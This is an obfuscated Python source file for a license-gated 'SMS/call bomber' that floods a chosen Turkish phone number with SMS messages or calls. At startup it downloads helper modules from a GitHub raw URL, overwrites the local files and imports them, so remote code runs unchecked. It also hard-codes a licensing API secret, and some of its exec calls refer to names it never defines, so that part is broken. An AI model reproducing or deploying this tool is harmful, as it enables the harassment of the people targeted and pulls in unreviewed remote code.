from keyauth import api 
import sys 
import time 
import platform 
import os 
import hashlib 
from time import sleep 
from datetime import datetime 
from colorama import Fore ,Style 
from time import sleep 
from os import system 
from requests import get 
from time import sleep 
from datetime import datetime 
if sys .version_info .minor <10 :
    print ("[Security] - Python 3.10 or higher is recommended. The bypass will not work on 3.10+")
    print ("You are using Python {}.{}".format (sys .version_info .major ,sys .version_info .minor ))
if platform .system ()=='Windows':
    os .system ('cls & title Python Example')
elif platform .system ()=='Linux':
    os .system ('clear')
    sys .stdout .write ("\x1b]0;Python Example\x07")
elif platform .system ()=='Darwin':
    os .system ("clear && printf '\e[3J'")
    os .system ('''echo - n - e "\033]0;Python Example\007"''')
print ("LEAREX SMS BOMBER")
def O000OOO000O00000O ():
    O000OO00O00O00O00 =hashlib .md5 ()
    OOO0O000OO000OOOO =open (''.join (sys .argv ),"rb")
    O000OO00O00O00O00 .update (OOO0O000OO000OOOO .read ())
    OO00OOO00OOO0OO00 =O000OO00O00O00O00 .hexdigest ()
    return OO00OOO00OOO0OO00 
OOOOOOOOOO0OOOOO0 =api (name ="devanil",ownerid ="S5mq4yf7Os",secret ="fab5b174201cae9c7d80d753bb5a967bd397ad4c365f758f333aa14f807daaa8",version ="1.0",hash_to_check =O000OOO000O00000O ())
def OOO0OO0O0OO0O00O0 ():
    try :
        print ("""
1.Giriş
2.Kayıt
        """)
        O0O0OOOO0OO0OO0OO =input ("Seçim: ")
        if O0O0OOOO0OO0OO0OO =="1":
            OOOO00O00O00OO0O0 =input ('Kullanıcı: ')
            O0000O0OO0O00O000 =input ('Şifre: ')
            OOOOOOOOOO0OOOOO0 .login (OOOO00O00O00OO0O0 ,O0000O0OO0O00O000 )
        elif O0O0OOOO0OO0OO0OO =="2":
            OOOO00O00O00OO0O0 =input ('Kullanıcı: ')
            O0000O0OO0O00O000 =input ('Şifre: ')
            O0O0000O0OOO0O0O0 =input ('Lisans: ')
            OOOOOOOOOO0OOOOO0 .register (OOOO00O00O00OO0O0 ,O0000O0OO0O00O000 ,O0O0000O0OOO0O0O0 )
        elif O0O0OOOO0OO0OO0OO =="3":
            OOOO00O00O00OO0O0 =input ('Kullanıcı: ')
            O0O0000O0OOO0O0O0 =input ('Lisans: ')
            OOOOOOOOOO0OOOOO0 .upgrade (OOOO00O00O00OO0O0 ,O0O0000O0OOO0O0O0 )
        elif O0O0OOOO0OO0OO0OO =="4":
            O00OO000O0O0O000O =input ('Senin Lisansın Enterla: ')
            OOOOOOOOOO0OOOOO0 .license (O00OO000O0O0O000O )
        else :
            print ("\nSeçim Bulunamadi")
            time .sleep (1 )
            os .system ('cls')
            OOO0OO0O0OO0O00O0 ()
    except KeyboardInterrupt :
        os ._exit (1 )
OOO0OO0O0OO0O00O0 ()
'''try:
    if os.path.isfile('auth.json'): #Checking if the auth file exist
        if jsond.load(open("auth.json"))["authusername"] == "": #Checks if the authusername is empty or not
            print("""
1. Login
2. Register
            """)
            ans=input("Select Option: ")  #Skipping auto-login bc auth file is empty
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license) 
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        else:
            try: #2. Auto login
                with open('auth.json', 'r') as f:
                    authfile = jsond.load(f)
                    authuser = authfile.get('authusername')
                    authpass = authfile.get('authpassword')
                    keyauthapp.login(authuser,authpass)
            except Exception as e: #Error stuff
                print(e)
    else: #Creating auth file bc its missing
        try:
            f = open("auth.json", "a") #Writing content
            f.write("""{
    "authusername": "",
    "authpassword": ""
}""")
            f.close()
            print ("""
1. Login
2. Register
            """)#Again skipping auto-login bc the file is empty/missing
            ans=input("Select Option: ") 
            if ans=="1": 
                user = input('Provide username: ')
                password = input('Provide password: ')
                keyauthapp.login(user,password)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            elif ans=="2":
                user = input('Provide username: ')
                password = input('Provide password: ')
                license = input('Provide License: ')
                keyauthapp.register(user,password,license)
                authfile = jsond.load(open("auth.json"))
                authfile["authusername"] = user
                authfile["authpassword"] = password
                jsond.dump(authfile, open('auth.json', 'w'), sort_keys=False, indent=4)
            else:
                print("\nNot Valid Option") 
                os._exit(1) 
        except Exception as e: #Error stuff
            print(e)
            os._exit(1) 
except Exception as e: #Error stuff
    print(e)
    os._exit(1)'''
print ("\nKullanıcı data: ")
print ("Kullanıcı adı: "+OOOOOOOOOO0OOOOO0 .user_data .username )
print ("IP address: "+OOOOOOOOOO0OOOOO0 .user_data .ip )
print ("Hardware-Id: "+OOOOOOOOOO0OOOOO0 .user_data .hwid )
OO00O0O00O0O00OOO =OOOOOOOOOO0OOOOO0 .user_data .subscriptions 
for OO00OO00OOOO0O0OO in range (len (OO00O0O00O0O00OOO )):
    OO0O0000O0000OO0O =OO00O0O00O0O00OOO [OO00OO00OOOO0O0OO ]["subscription"]
    O00O0OO0O0O0OO00O =datetime .utcfromtimestamp (int (OO00O0O00O0O00OOO [OO00OO00OOOO0O0OO ]["expiry"])).strftime ('%Y-%m-%d %H:%M:%S')
    O0O0O0OO000O0O0O0 =OO00O0O00O0O00OOO [OO00OO00OOOO0O0OO ]["timeleft"]
    print (f"[{OO00OO00OOOO0O0OO + 1} / {len(OO00O0O00O0O00OOO)}] | Subscription: {OO0O0000O0000OO0O} - Expiry: {O00O0OO0O0O0OO00O} - Timeleft: {O0O0O0OO000O0O0O0}")
O0O0O0OO000000OOO =OOOOOOOOOO0OOOOO0 .fetchOnline ()
O00O0OOOOO00OO000 =""
if O0O0O0OO000000OOO is None :
    O00O0OOOOO00OO000 ="No online users"
else :
    for OO00OO00OOOO0O0OO in range (len (O0O0O0OO000000OOO )):
        O00O0OOOOO00OO000 +=O0O0O0OO000000OOO [OO00OO00OOOO0O0OO ]["credential"]+" "
print ("\n"+O00O0OOOOO00OO000 +"\n")
print ("Oluşturma Tarihi: "+datetime .utcfromtimestamp (int (OOOOOOOOOO0OOOOO0 .user_data .createdate )).strftime ('%Y-%m-%d %H:%M:%S'))
print ("Önceki Giriş: "+datetime .utcfromtimestamp (int (OOOOOOOOOO0OOOOO0 .user_data .lastlogin )).strftime ('%Y-%m-%d %H:%M:%S'))
print ("Kalan Zaman: "+datetime .utcfromtimestamp (int (OOOOOOOOOO0OOOOO0 .user_data .expires )).strftime ('%Y-%m-%d %H:%M:%S'))
print (f"Oturum Aktifligi Dogrulandı: {OOOOOOOOOO0OOOOO0.check()}")
print ("Başlatılıyor...")
O00OO0OOOOO00000O =get ("https://raw.githubusercontent.com/anil101-8373/c4-anils/main/sms.py").text 
with open ("sms.py","r",encoding ="utf-8")as O000O0OOO00OOOOO0 :
    OO0O0000O0O000OOO =O000O0OOO00OOOOO0 .read ()
if OO0O0000O0O000OOO ==O00OO0OOOOO00000O :
    pass 
else :
    print (Fore .RED +"Güncelleme yapılıyor...")
    with open ("sms.py","w",encoding ="utf-8")as O000O0OOO00OOOOO0 :
        O000O0OOO00OOOOO0 .write (O00OO0OOOOO00000O )
from sms import SendSms 
O00OO0OOOOO00000O =get ("https://raw.githubusercontent.com/anil101-8373/c4-anils/main/call.py").text 
with open ("call.py","r",encoding ="utf-8")as O000O0OOO00OOOOO0 :
    OO0O0000O0O000OOO =O000O0OOO00OOOOO0 .read ()
if OO0O0000O0O000OOO ==O00OO0OOOOO00000O :
    pass 
else :
    print (Fore .RED +"Güncelleme yapılıyor...")
    with open ("call.py","w",encoding ="utf-8")as O000O0OOO00OOOOO0 :
        O000O0OOO00OOOOO0 .write (O00OO0OOOOO00000O )
from call import SendCall 
OOO0OO000OO000OOO =[]
for O0O0O000OO0O0O000 in dir (SendCall ):
    O000O0O000OOOOO0O =getattr (SendCall ,O0O0O000OO0O0O000 )
    if callable (O000O0O000OOOOO0O ):
        if O0O0O000OO0O0O000 .startswith ('__')==False :
            OOO0OO000OO000OOO .append (O0O0O000OO0O0O000 )
OO00OO0OO00O0O0OO =[]
for O0O0O000OO0O0O000 in dir (SendSms ):
    O000O0O000OOOOO0O =getattr (SendSms ,O0O0O000OO0O0O000 )
    if callable (O000O0O000OOOOO0O ):
        if O0O0O000OO0O0O000 .startswith ('__')==False :
            OO00OO0OO00O0O0OO .append (O0O0O000OO0O0O000 )
while 1 :
    system ("cls||clear")
    print ("""{}
    
PPPPPPPPPPPPPPPPPPPPPPG?!!~^^^^^^^^^^^^^^^^^^^^^^^~~7JPB&@@#PPP5!~~~~~~~~~~~~~~~~~~~~~~~~~~~^^^^^^^^
PPPPPPPPPPPPPPPPPPPPPPP7!~^^^^^^^^^^^^^^^^^^^^^^^^^^::^^~7JGPPP##GY?!^::::^^^^^^^^^^^^^^^^^^^^^^^^^^
PPPPPPPPPPPGGPPPPPPPPPP!!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^:JGPP55B#&&#G5?!^^:::^^^^^^^^^^^^^^^^^^^^^
PPPPPPPPPPPGPPPPPPPPPPY!~^^^^^^^^^^^^^^^^^^^^^^^^^^~~~!!!!!YGPG?~~!7?YPB&&#B5J7~^::::^^^^^^^^^^^^^^^
PPPPPPPPPPBGPPPPPPPPPGJ!^::^::::::::^^^^^~~~^^^^^^:::::^^^~?GPP?!!!!!~~~!7?YGB##BG5?!~^::::::^^^!^^^
PPPPPPPPPG#GPPPPPPPPPP?!7JJYP5JJY55PPPGGPPPPGB#BBGGP5Y?7!^:!GPP!!777!!!!!!~~^^~!?YPB##BGPYJ?7~~!~^^^
PPPPPPPPG##PPPPPPPPPPG&&#&&BGP5YJJ??777!!?5GB#####&&#&&&##G5PPP^:^~!77!!!!!!!!~~^::^~!7J5PGJ~~!^^^^^
PPPPPPPG###PPPPPPPPPPB&Y?7!!!~~~~~~~^^^7G##BGGGPPG@@#PPGB#&#GPG5?~::^~!!!!!!!!!!!~~^^:::::::^^^^^^^^
PPPPPPP###BPPPPPPPPPP##!~!!!~^^:..... ?##BPPPPP555GBG5PPPPG#BPPJ5GP?^:^~!!!!!!!!!!!!~^^^^^^^^^^^^^^^
PPPPPPB###BPPPPPPPPPP5&?!!^......... ?&PYJPPP555PPP5555PGP5GBPP^:~?PBY~^:~!!!!!!!!!!!!~^^^^^^^^^^^^^
PPPPPB####BPPPPPPPPPG?YG!: .........:B#Y7?PP55PB#&&#G5555PP5BGP^ ..:!YPJ~^^~!!!!!!!!!!!!~^^^^^^^^^^^
PPPPG#####BPPPPPPPPPG?^5Y.......... ^##PPPP555G&@@@@#P555GP5BGP^ .....~YY!~^^~!!!!!!!!!!77^^^^^^^^^^
PPPPB#####BPPPPPPPPPP7^^P~ ..........G#G5G##P5PG###BP55PGG55B#G~ ......:!J!^^^^!!!!!!!!!!!7~^^^^^^^^
PPPG######BPPPPPPPPPP7^:^P~ ........ ~##P##BPP55555555P#@&GG&BG7 ........^7!^^^^!!!!!!!!!!!7!^^^^^^^
PPP#######BPPPPPPPPPP7^^:~P7 ........ ~G#G55PPPPPPPPGPPPPG#&5:YY..........^!!^^^~!!!!!!!!!!!7!^^^^^^
PPG########PPPPPPPPPP7^^^:^YJ: ....... .?G#BGPPP5P5PPPPGB#P!  ~P:........ :!?~^^!!!!!!!!!!!!7!^^^^^^
PPB########PPPPPPPPPP!^^^^^:7J!:.        .~JPBBBBBBBBBG5?^     Y~ ......:~!7!^^!!!!!!!!!!!!77~^^^^^^
PG#########GPPPPPPPPP!^^^^^^^?BBG5?7!~~^^^:::^!7?JJ?7~^:::^^^~^7Y~!!777!!!~^:^~!!!!!!!!!!!77~^^^^^^^
PB#########GPPPPPPPPP!^^^^^7J?~!!~~~~~~!!!!!!!!!~~~~~~~!!!!~!~~^J7^^~^^^^^^^^~!!!!!!!!!!!7!^^^^^^^^^
P##########GPPPPPPPPP!^^^^^^::^^:^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^?^^^^^^^^^^~!!!!!!!!!!77!^^^^^^^^^^
G##########GPPPPPPPPP!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~!^^^^^^^^!!!!!!!!!!!7!~^^^^^^^^^^^
B##########BPPPPPPPPP!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~~^^^^^^!!!!!!!!!!77~^^^^^^^^^^^^^
B##########BPPPPPPPPP!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^!!!!!!!!!77!^^^^^^^^^^^^^^^
###########BPPPPPPPPP!^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^^~!!!!!!!77!^^^^^^^^^^^^^^^^^

 
    """.format (Fore .LIGHTCYAN_EX ,len (OO00OO0OO00O0O0OO ),len (OOO0OO000OO000OOO ),Style .RESET_ALL ,Fore .LIGHTRED_EX ))
    sleep (1 )
    system ("cls||clear")
    print (Fore .LIGHTRED_EX +"LEAREX SMS BOMBER")
    sleep (1 )
    print (Fore .LIGHTRED_EX +"iade yasaktır.")
    print (Fore .LIGHTWHITE_EX +"key paylaşmak yasaktır.")
    print (Fore .LIGHTWHITE_EX +"SORUMLULUK KABUL EDILMEZ")
    sleep (1 )
    system ("cls||clear")
    try :
        OO0O0O000000O0OOO =int (input (Fore .LIGHTWHITE_EX +"1- SMS Boomber\n2- Call Boomber\n\n"+Fore .LIGHTGREEN_EX +": "))
    except ValueError :
        system ("cls||clear")
        print (Fore .LIGHTRED_EX +"Hatalı Giriş.")
        sleep (3 )
        continue 
    if OO0O0O000000O0OOO ==1 :
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +"Lutfen +90 Olmadan Telefon Numarası Yazınız: "+Fore .LIGHTGREEN_EX ,end ="")
            OOO00O0O0000OOO00 =int (input ())
            if len (str (OOO00O0O0000OOO00 ))!=10 :
                raise ValueError 
        except ValueError :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı telefon numarası.")
            sleep (3 )
            continue 
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +"Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+Fore .LIGHTGREEN_EX ,end ="")
            OOO0O00O000OOO0O0 =input ()
            if ("@"not in OOO0O00O000OOO0O0 or ".com"not in OOO0O00O000OOO0O0 )and OOO0O00O000OOO0O0 !="":
                raise 
        except :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı mail adresi.")
            sleep (3 )
            continue 
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +"Lutfen Kac Adet Gondermek Istedıgınızı Yazınız.: "+Fore .LIGHTGREEN_EX ,end ="")
            OO00OO0O0OO0OOOO0 =int (input ())
        except ValueError :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptınız. Tekrar deneyiniz.")
            sleep (3 )
            continue 
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +"Kaç saniye aralıkla göndermek istiyorsun: "+Fore .LIGHTGREEN_EX ,end ="")
            O00O0O000O000OO0O =int (input ())
        except ValueError :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptınız. Tekrar deneyiniz.")
            sleep (3 )
            continue 
        system ("cls||clear")
        OOO000O0OOO000O00 =SendSms (OOO00O0O0000OOO00 ,OOO0O00O000OOO0O0 )
        while OOO000O0OOO000O00 .adet <OO00OO0O0OO0OOOO0 :
            for O0O0O000OO0O0O000 in dir (SendSms ):
                O000O0O000OOOOO0O =getattr (SendSms ,O0O0O000OO0O0O000 )
                if callable (O000O0O000OOOOO0O ):
                    if O0O0O000OO0O0O000 .startswith ('__')==False :
                        if OOO000O0OOO000O00 .adet ==OO00OO0O0OO0OOOO0 :
                            break 
                        exec ("sms."+O0O0O000OO0O0O000 +"()")
                        sleep (O00O0O000O000OO0O )
        print (Fore .LIGHTRED_EX +"\nMenüye dönmek için 'enter' tuşuna basınız..")
        input ()
    elif OO0O0O000000O0OOO ==2 :
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +"Lutfen +90 Olmadan Telefon Numarası Yazınız: "+Fore .LIGHTGREEN_EX ,end ="")
            OOO00O0O0000OOO00 =int (input ())
            if len (str (OOO00O0O0000OOO00 ))!=10 :
                raise ValueError 
        except ValueError :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı telefon numarası.")
            sleep (3 )
            continue 
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +"Mail adresi (Bilmiyorsanız 'enter' tuşuna basın): "+Fore .LIGHTGREEN_EX ,end ="")
            OOO0O00O000OOO0O0 =input ()
            if ("@"not in OOO0O00O000OOO0O0 or ".com"not in OOO0O00O000OOO0O0 )and OOO0O00O000OOO0O0 !="":
                raise 
        except :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı mail adresi.")
            sleep (3 )
            continue 
        system ("cls||clear")
        try :
            print (Fore .LIGHTYELLOW_EX +f"Kaç kere aransın (max: {len(OOO0OO000OO000OOO)}): "+Fore .LIGHTGREEN_EX ,end ="")
            OO00OO0O0OO0OOOO0 =int (input ())
            if OO00OO0O0OO0OOOO0 >len (OOO0OO000OO000OOO ):
                raise ValueError 
        except ValueError :
            system ("cls||clear")
            print (Fore .LIGHTRED_EX +"Hatalı giriş yaptınız.")
            sleep (3 )
            continue 
        system ("cls||clear")
        OO00O0O000000OO0O =SendCall (OOO00O0O0000OOO00 ,OOO0O00O000OOO0O0 )
        while OO00O0O000000OO0O .adet <OO00OO0O0OO0OOOO0 :
            for O0O0O000OO0O0O000 in dir (SendCall ):
                O000O0O000OOOOO0O =getattr (SendCall ,O0O0O000OO0O0O000 )
                if callable (O000O0O000OOOOO0O ):
                    if O0O0O000OO0O0O000 .startswith ('__')==False :
                        if OO00O0O000000OO0O .adet ==OO00OO0O0OO0OOOO0 :
                            break 
                        exec ("call."+O0O0O000OO0O0O000 +"()")
        print (Fore .LIGHTRED_EX +"\nMenüye dönmek için 'enter' tuşuna basınız..")
        input ()
    elif OO0O0O000000O0OOO ==3 :
        system ("cls||clear")
        print (Fore .LIGHTRED_EX +"Çıkış yapılıyor...")
        break 
